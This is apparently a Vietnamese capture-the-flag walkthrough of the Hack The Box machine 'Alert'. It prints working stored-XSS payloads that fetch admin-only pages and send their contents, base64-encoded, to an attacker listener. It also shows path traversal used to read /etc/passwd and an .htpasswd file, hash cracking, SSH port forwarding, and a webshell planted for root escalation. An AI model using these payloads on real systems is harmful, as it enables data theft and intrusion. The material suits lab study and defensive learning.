<img width="840" height="964" alt="image" src="https://github.com/user-attachments/assets/f3db5f93-8b91-4227-9344-f95f259af595" /># Alert

Tôi dùng lệnh `nmap -sV 10.10.11.44` để scan các port thì có 80 và 22:

<img width="997" height="329" alt="image" src="https://github.com/user-attachments/assets/b816aa11-7185-4c98-a15a-9102fbe62055" />

Truy cập vào thì ra url `http://alert.htb/` 

<img width="1793" height="1000" alt="image" src="https://github.com/user-attachments/assets/b4b147f2-3d87-4abf-8429-bf8a88a84960" />

Trong quá trình fuzz thì tôi tìm thêm được `messages.php` nhưng không biết là nhận tham số gì:

<img width="869" height="974" alt="image" src="https://github.com/user-attachments/assets/e1aa48d3-e038-4fd7-ac76-dba2d038ae82" />

Dò bằng `arjun -u "http://alert.htb/messages.php"` nhưng không ra, tôi sẽ để đây vậy

<img width="865" height="359" alt="image" src="https://github.com/user-attachments/assets/8c59a6dc-8f55-482f-ac38-a83fec895dcd" />

##

Tôi dùng ffuf thì fuzz được thêm 1 cái subdomain là `http://statistics.alert.htb/` :
```
ffuf -u http://10.10.11.44/ -H 'Host: FUZZ.alert.htb' -w wordlist/subdomains-top1mil-20000.txt -mc 200,301,302,307,401,403 -ac -t 100
```

<img width="1593" height="572" alt="image" src="https://github.com/user-attachments/assets/35c2fa74-8350-4c1b-b378-ce73ea5ea9be" />

<img width="1825" height="723" alt="image" src="https://github.com/user-attachments/assets/04015b84-1c65-44e1-b7ed-412ad7f9c339" />

Nó yêu cầu username và mật khẩu nhưng tôi không biết, quay lại tiếp tục khám phá website kia 

Qua qua về website `http://alert.htb/` thì website này có chức năng render markdown và cso thể share được:
```
<script>alert(window.origin)</script>
```

<img width="1246" height="315" alt="image" src="https://github.com/user-attachments/assets/4abf5af5-db90-442e-abd1-f02dbe1ea81e" />

Và có thể gửi được request đi:
```
<script>fetch("http://10.10.14.5:1234/")</script>
```

<img width="1689" height="761" alt="image" src="https://github.com/user-attachments/assets/c2bf9043-e653-48f6-82e8-f37841558cba" />

Tôi ấn vào nút `share markdown` và lấy được link để share `http://alert.htb/visualizer.php?link_share=68af1d454a2504.61150899.md`, tôi thử vào sử dụng chức năng contact và gửi cho admin xem sao và đã trả lại 
response về, suy ra là bên contact có ấn vào đường link tôi gửi, tôi thử xem nội dung của 1 số đường dẫn đặc biệt bên admin xem có gì không, ví dụ như:
```
<script>fetch('/messages.php').then(r => r.text()).then(d => { let b64 = btoa(d); new Image().src='http://10.10.14.5:1234/?data=' + b64; })</script>
```

<img width="1748" height="960" alt="image" src="https://github.com/user-attachments/assets/7e84a040-7533-4ed2-8bff-4e9728346dd4" />

<img width="1539" height="639" alt="image" src="https://github.com/user-attachments/assets/a44f82d0-d050-44e8-a71c-a541d1f8a75b" />

Ở đây thì nội dung của nó là cách sử dụng cái `messages.php` là thêm tham số `file` vào, tôi thêm thử thì được, tôi thử xem nội dung của file txt đó thông qua contact mà chả có gì, dù tôi có thêm param thì cũng không 
trả lại nội dung gì cả:

<img width="828" height="237" alt="image" src="https://github.com/user-attachments/assets/de576cea-c955-48dc-aa14-00a5a4007e33" />

Tôi thử đi kèm với payload thì xuất hiện path traversal:
```
<script>fetch('/messages.php?file=../../../../../../../../../etc/passwd').then(r => r.text()).then(d => { let b64 = btoa(d); new Image().src='http://10.10.14.5:1234/?data=' + b64; })</script>
```

<img width="1739" height="947" alt="image" src="https://github.com/user-attachments/assets/d339153f-f9ef-47fe-a016-5c422fee35d2" />

<img width="964" height="881" alt="image" src="https://github.com/user-attachments/assets/7cca5f8f-8c44-4a58-b5e9-2fcb6bce3317" />

Thông qua search google và chatgpt thì tôi tìm được vị trí file config nên đọc là `/etc/apache2/sites-available/000-default.conf`:
```
<script>fetch('/messages.php?file=../../../../../../../../../etc/apache2/sites-available/000-default.conf').then(r => r.text()).then(d => { let b64 = btoa(d); new Image().src='http://10.10.14.5:1234/?data=' + b64; })</script>
```

<img width="1753" height="965" alt="image" src="https://github.com/user-attachments/assets/3bc16127-64cf-451b-9d74-e1b61d5cf489" />

<img width="1450" height="875" alt="image" src="https://github.com/user-attachments/assets/c3bbfb46-fecf-4973-92dc-1eea8f475539" />

Tôi thấy có 1 đường dẫn nhìn khá là có giá trị `/var/www/statistics.alert.htb/.htpasswd`:
```
<script>fetch('/messages.php?file=../../../../../../../../../var/www/statistics.alert.htb/.htpasswd').then(r => r.text()).then(d => { let b64 = btoa(d); new Image().src='http://10.10.14.5:1234/?data=' + b64; })</script>
```

<img width="1436" height="658" alt="image" src="https://github.com/user-attachments/assets/4b23029d-434e-41dd-8447-4921a9defff5" />

Ra được mật khẩu của user `albert`, tra trong hashcat thì là mode 1600:

<img width="1009" height="116" alt="image" src="https://github.com/user-attachments/assets/67ff0461-267c-4579-a9ff-024230efab5f" />

Chạy hashcat thì crack ra được `manchesterunited` là dạng plaintext, thử đăng nhập vào `statistics.alert.htb` thì được:

<img width="1804" height="1014" alt="image" src="https://github.com/user-attachments/assets/7b4b6232-ffc9-4074-88b7-94eae35f0830" />

Đây là cái dashboard thôi và không có gì hữu ích lắm, tôi tiếp tục thử ssh vào server:

<img width="1341" height="928" alt="image" src="https://github.com/user-attachments/assets/1da512aa-38ae-4ba5-be2f-733cd7c246ce" />

Tôi thêm [pspy](https://github.com/DominicBreuker/pspy) vào server để kiểm tra các tiến trình đang chạy:
```
scp ~/Documents/pspy64 albert@10.10.11.44:/tmp
```

<img width="834" height="212" alt="image" src="https://github.com/user-attachments/assets/032184e6-0995-440b-b1c6-18826b576c1f" />

Tôi kiểm tra các tiến trình thì có xuất hiện tiến trình đáng ngờ của file php nằm ở `/opt/website-monitor/config/configuration.php`:

<img width="1561" height="549" alt="image" src="https://github.com/user-attachments/assets/cac81335-979e-49d6-89ad-c92e3cb3ab74" />

Truy cập vào `/opt/website-monitor/config/` thì có vẻ ở đây có src code của web nào đó mà tôi không biết
```
albert@alert:/opt/website-monitor$ ls -la
total 96
drwxrwxr-x 7 root root        4096 Oct 12  2024 .
drwxr-xr-x 4 root root        4096 Oct 12  2024 ..
drwxrwxr-x 2 root management  4096 Aug 27 14:05 config
drwxrwxr-x 8 root root        4096 Oct 12  2024 .git
drwxrwxr-x 2 root root        4096 Oct 12  2024 incidents
-rwxrwxr-x 1 root root        5323 Oct 12  2024 index.php
-rwxrwxr-x 1 root root        1068 Oct 12  2024 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12  2024 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12  2024 monitors
-rwxrwxr-x 1 root root         104 Oct 12  2024 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12  2024 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12  2024 README.md
-rwxrwxr-x 1 root root        1918 Oct 12  2024 style.css
drwxrwxr-x 2 root root        4096 Oct 12  2024 updates
```

Tôi kiểm tra bằng lệnh `netstat -anv | grep LISTEN` để xem các port nào đang mở trên server thì có xuất hiện port 8080:

<img width="1076" height="803" alt="image" src="https://github.com/user-attachments/assets/8e26701d-1e63-42a9-beef-700989742603" />

Tôi nối port 8080 từ ssh ra máy của tôi bằng:
```
ssh -L 8080:localhost:8080 albert@10.10.11.44
```

Truy cập vào thì ra website này:

<img width="1814" height="865" alt="image" src="https://github.com/user-attachments/assets/4cf7802c-9bb0-4078-8d0f-18f1c7391cbb" />

Do `albert` là user thuộc group `management`, có thể check ở `/etc/group`, thế nên tôi có thể thêm hoặc xóa file trong thư mục `config` đó, tôi thêm webshell vào:

<img width="783" height="119" alt="image" src="https://github.com/user-attachments/assets/dd6b9255-e17e-4ac9-99de-f1a5eb44d073" />

<img width="827" height="206" alt="image" src="https://github.com/user-attachments/assets/16a4c654-38bd-4baa-89cf-24181a96786c" />

<img width="726" height="152" alt="image" src="https://github.com/user-attachments/assets/131dbe93-e45a-44d2-95ab-be8b1f87dcf9" />

Bằng 1 cách thần kì nào đó thì tôi không sửa được file `configuration.php`, cơ mà vẫn leo lên root được 






